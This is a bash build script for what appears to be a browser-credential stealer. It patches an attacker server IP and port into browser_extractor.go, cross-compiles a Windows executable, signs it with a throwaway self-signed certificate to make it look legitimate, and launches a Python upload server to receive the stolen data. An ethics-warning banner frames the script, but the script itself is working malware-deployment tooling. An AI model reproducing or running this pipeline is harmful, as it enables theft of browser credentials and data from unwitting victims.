#!/bin/bash
set -e

# ===== ANSI Colors =====
RED="\033[31m"
BLUE="\033[34m"
BOLD="\033[1m"
RESET="\033[0m"
GREEN="\033[32m"
YELLOW="\033[33m"

# ===== Utility =====
command_exists() { command -v "$1" >/dev/null 2>&1; }

print_ascii_art() {
    printf "${RED}${BOLD}\n"
    printf "░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░       ░▒▓████████▓▒░      ░▒▓███████▓▒░       ░▒▓███████▓▒░        ░▒▓███████▓▒░      \n"
    printf "░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             \n"
    printf "░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             \n"
    printf "░▒▓████████▓▒░       ░▒▓██████▓▒░       ░▒▓███████▓▒░       ░▒▓██████▓▒░        ░▒▓███████▓▒░       ░▒▓███████▓▒░        ░▒▓██████▓▒░       \n"
    printf "░▒▓█▓▒░░▒▓█▓▒░         ░▒▓█▓▒░          ░▒▓█▓▒░             ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░                    ░▒▓█▓▒░      \n"
    printf "░▒▓█▓▒░░▒▓█▓▒░         ░▒▓█▓▒░          ░▒▓█▓▒░             ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░                    ░▒▓█▓▒░      \n"
    printf "░▒▓█▓▒░░▒▓█▓▒░         ░▒▓█▓▒░          ░▒▓█▓▒░             ░▒▓████████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓███████▓▒░       \n"
    printf "${RESET}\n"
}

print_ethics_notice() {
    echo -e "${BOLD}${RED}"
    echo "******************************************************************"
    echo "  WARNING: EDUCATIONAL & ETHICAL USE ONLY"
    echo "  Unauthorized use is ILLEGAL and may result in prosecution."
    echo "  Use only on systems you own or have explicit permission to test."
    echo "******************************************************************"
    echo -e "${RESET}"
}

# ===== Main =====
print_ascii_art
print_ethics_notice

echo -e "${YELLOW}[*] Checking required dependencies...${RESET}"

# Required tools list
REQUIRED_TOOLS=(go x86_64-w64-mingw32-gcc osslsigncode openssl python3)
for cmd in "${REQUIRED_TOOLS[@]}"; do
    if ! command_exists "$cmd"; then
        echo -e "${RED}[!] Missing: $cmd${RESET}"
        case "$cmd" in
            x86_64-w64-mingw32-gcc) sudo apt-get install -y gcc-mingw-w64-x86-64 ;;
            osslsigncode) sudo apt-get install -y osslsigncode ;;
            openssl) sudo apt-get install -y openssl ;;
            go) echo "Install Go from: https://golang.org/dl/"; exit 1 ;;
            python3) echo "Install Python3 from: https://www.python.org/downloads/"; exit 1 ;;
        esac
    else
        echo -e "${GREEN}[+] Found: $cmd${RESET}"
    fi
done

# SQLite3 headers
if ! dpkg -s libsqlite3-dev >/dev/null 2>&1; then
    sudo apt-get install -y libsqlite3-dev
fi

# ===== Ask server info =====
read -rp "Enter server IP (default 127.0.0.1): " input_ip
read -rp "Enter server port (default 8000): " input_port
SERVER_IP=${input_ip:-127.0.0.1}
SERVER_PORT=${input_port:-8000}
UPLOAD_URL="http://${SERVER_IP}:${SERVER_PORT}/upload"
echo -e "${BLUE}[*] Upload URL set to: ${UPLOAD_URL}${RESET}"

# ===== Update Go source placeholders =====
if [[ -f browser_extractor.go ]]; then
    sed -i "s|{{IP}}|${SERVER_IP}|g" browser_extractor.go
    sed -i "s|{{PORT}}|${SERVER_PORT}|g" browser_extractor.go
    echo -e "${GREEN}[+] Updated placeholders in browser_extractor.go${RESET}"
else
    echo -e "${RED}[!] browser_extractor.go not found.${RESET}"
    exit 1
fi

# ===== Kill process if port in use =====
PIDS=$(lsof -ti tcp:"${SERVER_PORT}" || true)
if [ -n "$PIDS" ]; then
    sudo kill -9 $PIDS
    echo -e "${YELLOW}[*] Freed port ${SERVER_PORT}${RESET}"
fi

# ===== Build executable =====
export CGO_ENABLED=1
export GOOS=windows
export GOARCH=amd64
export CC=x86_64-w64-mingw32-gcc
echo -e "${YELLOW}[*] Building extractor.exe...${RESET}"
go build -o extractor.exe browser_extractor.go

if [ ! -f extractor.exe ]; then
    echo -e "${RED}[-] Build failed.${RESET}"
    exit 1
fi
echo -e "${GREEN}[+] Build successful!${RESET}"

# ===== Generate unique cert & sign =====
CERT_NAME="cert_$(date +%s).pem"
KEY_NAME="key_$(date +%s).pem"
PFX_NAME="cert_$(date +%s).pfx"
PASSWORD=$(openssl rand -hex 8)

openssl req -x509 -newkey rsa:2048 -keyout "$KEY_NAME" -out "$CERT_NAME" \
  -days 365 -nodes -subj "/CN=SecureSigner$(date +%s)/O=TestOrg"

openssl pkcs12 -export -out "$PFX_NAME" -inkey "$KEY_NAME" -in "$CERT_NAME" \
  -password pass:$PASSWORD

SIGNED_EXE="extractor_signed.exe"
osslsigncode sign -pkcs12 "$PFX_NAME" -pass "$PASSWORD" \
  -n "Browser Extractor" -i "http://example.com" \
  -in extractor.exe -out "$SIGNED_EXE"

echo -e "${GREEN}[+] Signed executable: $SIGNED_EXE${RESET}"

# ===== Start Python server =====
echo -e "${YELLOW}[*] Starting Python server...${RESET}"
python3 server.py

# ===== Final reminder =====
print_ethics_notice

